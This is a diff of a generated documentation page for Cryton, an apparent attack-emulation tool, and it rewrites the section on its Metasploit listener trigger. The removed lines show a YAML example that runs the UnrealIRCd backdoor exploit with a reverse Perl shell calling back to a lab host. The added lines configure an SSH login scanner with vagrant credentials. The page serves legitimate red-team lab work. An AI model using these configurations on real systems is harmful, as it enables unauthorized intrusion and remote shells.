@@ -18,7 +18,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.18">
+      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.22">
     
     
       
@@ -26,7 +26,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.66ac8b77.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.732c4fb1.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
@@ -1753,49 +1753,16 @@ An example can be found <a href="https://gitlab.ics.muni.cz/cryton/cryton-core/-
 <span class="w">          </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">value</span><span class="w">  </span><span class="c1"># Parameter&#39;s value.</span>
 </code></pre></div>
 <h3 id="msf-listener">MSF listener<a class="headerlink" href="#msf-listener" title="Permanent link">&para;</a></h3>
-<p>The stage will be executed when a session with the user-defined arguments is returned from Worker. Once the session is saved, 
-it can be used in a Step with <code>use_named_session: my-stage-name_session</code>, where <code>my-stage-name</code> is the Stage's name.<br />
+<p>MSF listener runs an exploit same as the Metasploit module.<br />
+The stage will be executed when a session with the user-defined arguments is returned from Worker. Once the session is saved, 
+it can be used in a Step with <code>use_named_session: my-stage-name_session</code>, where <code>my-stage-name</code> is the name of the Stage.<br />
 An example can be found <a href="https://gitlab.ics.muni.cz/cryton/cryton-core/-/blob/stable/1/examples/msf-trigger-example/template.yml">here</a>.</p>
 <p>The only downside is that it doesn't support the <a href="../step/#output-sharing">output sharing</a> feature.</p>
-<p>Identifiers are arguments that can be used to identify an MSF session that we are waiting for to trigger the Stage.<br />
-By default, the MSFTrigger will try to find a match using the <code>via_exploit</code> and <code>via_payload</code> parameters based on the used MSF module and payload. You can override this behavior using the <code>indentifiers</code> parameter.<br />
-Since the values in identifiers can be substrings. You can use <code>handler</code> to match <code>exploit/multi/handler</code>.
 <div class="highlight"><pre><span></span><code><span class="nt">trigger_type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MSFListener</span>
 <span class="nt">trigger_args</span><span class="p">:</span>
-<span class="w">  </span><span class="nt">identifiers</span><span class="p">:</span><span class="w"> </span><span class="c1"># Optional</span>
-<span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">shell</span>
-<span class="w">    </span><span class="nt">tunnel_local</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.56.50:4444</span>
-<span class="w">    </span><span class="nt">tunnel_peer</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.56.51:35380</span>
-<span class="w">    </span><span class="nt">via_exploit</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/irc/unreal_ircd_3281_backdoor</span>
-<span class="w">    </span><span class="nt">via_payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">payload/cmd/unix/reverse_perl</span>
-<span class="w">    </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Command shell</span>
-<span class="w">    </span><span class="nt">info</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;&#39;</span>
-<span class="w">    </span><span class="nt">workspace</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;false&#39;</span>
-<span class="w">    </span><span class="nt">session_host</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.56.50</span>
-<span class="w">    </span><span class="nt">session_port</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;4444&#39;</span>
-<span class="w">    </span><span class="nt">target_host</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;&#39;</span>
-<span class="w">    </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">vagrant</span>
-<span class="w">    </span><span class="nt">uuid</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">o3mnfksh</span>
-<span class="w">    </span><span class="nt">exploit_uuid</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">vkzl8sib</span>
-<span class="w">    </span><span class="nt">routes</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;&#39;</span>
-<span class="w">    </span><span class="nt">arch</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python</span>
-<span class="w">  </span><span class="nt">exploit</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unix/irc/unreal_ircd_3281_backdoor</span><span class="w">  </span><span class="c1"># Exploit to use.</span>
-<span class="w">  </span><span class="nt">exploit_arguments</span><span class="p">:</span><span class="w">  </span><span class="c1"># Arguments that will be passed to the exploit.</span>
-<span class="w">    </span><span class="nt">RHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.56.51</span>
-<span class="w">    </span><span class="nt">RPORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">6697</span>
-<span class="w">  </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/reverse_perl</span><span class="w">  </span><span class="c1"># Payload to use.</span>
-<span class="w">  </span><span class="nt">payload_arguments</span><span class="p">:</span><span class="w">  </span><span class="c1"># Arguments that will be passed to the payload.</span>
-<span class="w">    </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.56.50</span>
-<span class="w">    </span><span class="nt">LPORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">4444</span>
-</code></pre></div></p>
-<div class="highlight"><pre><span></span><code><span class="nt">trigger_type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MSFListener</span>
-<span class="nt">trigger_args</span><span class="p">:</span>
-<span class="w">  </span><span class="nt">identifiers</span><span class="p">:</span>
-<span class="w">    </span><span class="nt">via_exploit</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">auxiliary/scanner/ssh/ssh_login</span>
-<span class="w">    </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">vagrant</span>
-<span class="w">  </span><span class="nt">auxiliary</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scanner/ssh/ssh_login</span><span class="w">  </span><span class="c1"># Auxiliary module to use.</span>
-<span class="w">  </span><span class="nt">auxiliary_arguments</span><span class="p">:</span><span class="w">  </span><span class="c1"># Arguments that will be passed to the auxiliary module.</span>
-<span class="w">    </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.168.56.51</span>
+<span class="w">  </span><span class="nt">module_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scanner/ssh/ssh_login</span>
+<span class="w">  </span><span class="nt">datastore</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CHANGE_ME</span>
 <span class="w">    </span><span class="nt">USERNAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">vagrant</span>
 <span class="w">    </span><span class="nt">PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">vagrant</span>
 </code></pre></div>
@@ -1907,7 +1874,7 @@ finished, before its execution. All you have to do is define the <code>depends_o
     <script id="__config" type="application/json">{"base": "../..", "features": ["content.tabs.link", "content.code.copy", "navigation.tracking", "navigation.top", "navigation.instant", "navigation.instant.progress", "navigation.indexes", "navigation.footer", "search.highlight", "toc.follow"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": {"provider": "mike"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.3220b9d7.min.js"></script>
+      <script src="../../assets/javascripts/bundle.5cfa9459.min.js"></script>
       
     
   </body>
